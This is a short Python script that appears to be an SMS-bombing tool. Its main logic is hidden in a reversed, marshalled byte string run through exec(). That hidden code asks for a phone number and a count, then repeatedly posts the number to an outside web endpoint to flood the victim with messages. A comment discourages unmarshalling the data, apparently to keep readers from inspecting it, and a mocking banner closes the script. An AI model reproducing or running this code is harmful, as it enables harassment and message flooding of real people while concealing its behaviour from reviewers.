
# script coded by lil melachronous
# never unmarshal, cause this is mallicious constructed data
# for requirements please install python requests or
# use "pip install requests"

import marshal;import time,sys;s = marshal.loads(b'''\xf3\x10\x01\x00\x00\n)"...iaseleS"(tnirp\n))lav(tamrof."SMS }{...moB"(tnirp    \n)}lav:"halmuj",mun:"remon"{=atad ,tsoh(tsop.stseuqer    \n:)lav(egnar ni i rof\n))":halmuj"(tupni(tni = lav\n)":remon"(tupni = mun\n"php.xedni/gro.gncafe//:ptth" = tsoh\n)"+++++++BMOB-SMS+++++++"(tnirp\nstseuqer tropmi\n''');exec(s[::-1]);banner = "\033[91mSlow aja gan, ane hanya noob hahahaha\033[0m\033[92m\nTugas selesai *_^\033[0m";
for i in banner:
        print(i,end="")
        sys.stdout.flush()
        time.sleep(0.02)